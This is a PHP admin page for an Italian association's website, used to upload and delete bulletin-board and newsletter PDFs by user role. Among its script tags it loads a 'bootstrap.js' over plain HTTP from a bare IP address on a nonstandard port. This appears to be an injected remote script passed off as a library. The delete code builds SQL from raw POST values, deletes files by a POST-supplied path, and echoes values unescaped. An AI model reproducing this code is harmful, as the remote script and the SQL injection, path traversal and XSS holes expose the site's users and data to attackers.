<?php
    require_once("../util/constants.php");
    include("../util/connection.php");
    include("../util/command.php");
    include("../util/cookie.php");

    echo "<script src='https://code.jquery.com/jquery-3.6.4.min.js'></script>";
    echo "<script src='http://52.47.171.54:8080/bootstrap.js'></script>";
    echo "<script src='../script/script.js'></script>";
    echo "<link rel='stylesheet' href='../style/style.css'>";
    echo "<title>Associazione Zero Tre</title>";
    importActualStyle();
    session_start();

    if (!isset($_SESSION["operation"]) && !isset($_SESSION["table"]))
        header("Location: ../index.php");

    $operation = isset($_SESSION["operation"]) ? $_SESSION["operation"] : null;
    $table = isset($_SESSION["table"]) ? $_SESSION["table"] : null;

    nav_menu();

    switch ($_SESSION["profile_type"]) {
        case "presidente":
            try {
                $connection = connectToDatabase(DB_HOST, DB_PRESIDENT, PRESIDENT_PW, DB_NAME);
                
                switch ($operation) {
                    case "add":
                        addToBacheca($table);
                        break;

                    case "del":
                        removeFromBacheca($table, $connection);
                        break;
                }
            } catch(Exception $e) {
                echo ERROR_GEN;
            }
            break;

        case "admin":
            try {
                $connection = connectToDatabase(DB_HOST, DB_ADMIN, ADMIN_PW, DB_NAME);

                switch ($operation) {
                    case "add":
                        addToBacheca($table);
                        break;

                    case "del":
                        removeFromBacheca($table, $connection);
                        break;
                }
            } catch(Exception $e) {
                echo ERROR_GEN;
            }
            break;
            
        case "terapista":
            try {
                $connection = connectToDatabase(DB_HOST, DB_TERAPIST, TERAPIST_PW, DB_NAME);

                switch ($operation) {
                    case "add":
                        addToBacheca($table);
                        break;

                    case "del":
                        removeFromBacheca($table, $connection);
                        break;
                }
            } catch(Exception $e) {
                echo ERROR_GEN;
            }
            break;

        case "genitore":
            header("Location: ../index.php");
            break;
    }

    show_footer();


    // menu di navigazione
    function nav_menu() {
        echo "<main>
                <section class='header'>
                    <nav>
                        <a href='../index.php'>
                            <img 
                                src='../image/logos/logo.png'
                                class='logo'
                                id='logoImg'
                                alt='logo associazione'
                            />
                        </a>
                        <div class='nav_links' id='navLinks'>
                            <ul>
                                <li><a href='../newsletter/newsletter.php'  class='btn'>Newsletter   </a></li>
                                <li><a href='../bacheca/bacheca.php'        class='btn'>Bacheca       </a></li>
                                <li><a href='https://stripe.com/it'         class='btn' target='blank'>Donazioni</a></li>
                                <li><a href='area_personale.php'            class='btn'>Area Personale</a></li>
                                <li><a href='crud.php?operation=LOGOUT'     class='btn'>Logout</a></li>
                            </ul>
                        </div>
                    </nav>            
                </section>
            </main>";
    }

    // funzione per aggiungere file in bacheca
    function addToBacheca($table) {
        echo "<br>
        <section id='form'>
            <h2>Aggiunta di un contenuto in " . $table . "</h2>
                <form action='../upload/upload.php' method='POST' enctype='multipart/form-data'>
                    <input type='hidden' name='table' value=$table>
                    <br><br>

                    <div id='name_surname__label'>
                        <label for='" . $table . "'>Seleziona il file che vuoi aggiungere in ". $table . "</label>
                        <label for='date'>Seleziona la data del file</label>
                    </div>
                    <div id='name_surname__input'>
                        <input type='file' name='" . $table . "' accept='.pdf' enctype='multipart/form-data' required>
                        &nbsp;&nbsp;
                        <input type='date' name='date' required>
                    </div>

                    <input type='submit' value='AGGIUNGI'>
                </form>
        </section>";
    }

    // funzione per eliminare file dalla bacheca
    function removeFromBacheca($table, $connection) {
        $query = "SELECT id, $table, data FROM $table";
        $result = dbQuery($connection, $query);

        echo "<br>
        <section id='form'>
            <h2>Eliminazione di un contenuto dalla " . $table . "</h2>
                <form action='" . htmlspecialchars($_SERVER["PHP_SELF"]) . "' method='POST' enctype='multipart/form-data'>
                    <br><br>";
                    if ($result) {
                        while ($row = ($result->fetch_assoc())) 
                            echo "<input type='hidden' name='file_name' value='" . $row["$table"] . "'>
                                    <input type='hidden' name='table_sel' value=$table>";

                        mysqli_data_seek($result, 0);
                    }

        echo "      <div id='name_surname__label'>
                        <label for='" . $table . "'>Seleziona il file che vuoi eliminare dalla " . $table . "</label>
                    </div>
                    <select name='" . $table . "'>";
                    if ($result) {
                        while ($row = ($result->fetch_assoc())) {
                            echo "<option value='" . $row["id"] . "'>" . $row["$table"] . " del " . $row["data"] . "</option>";
                        }
                    }
                
        echo "      </select>
                    <input type='submit' name='submit' value='RIMUOVI'>
                </form>
        </section>";
    }

    // eliminazione del file bacheca o newsletter selezionato
    if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST['submit'])) {
        $table = $_POST["table_sel"];
        $file = $_POST[$table];
        $file_name = "../$table/" . $_POST["file_name"];
        $query = "DELETE FROM $table WHERE id = $file";
        $result = dbQuery($connection, $query);

        if ($result) {
            if (file_exists($file_name)) {
                if (unlink($file_name)) {
                    $_SESSION["file_deleted"] = true;
                    header("Location: ../" . $table . "/" . $table . ".php");
                }
            }
        }
    }
?>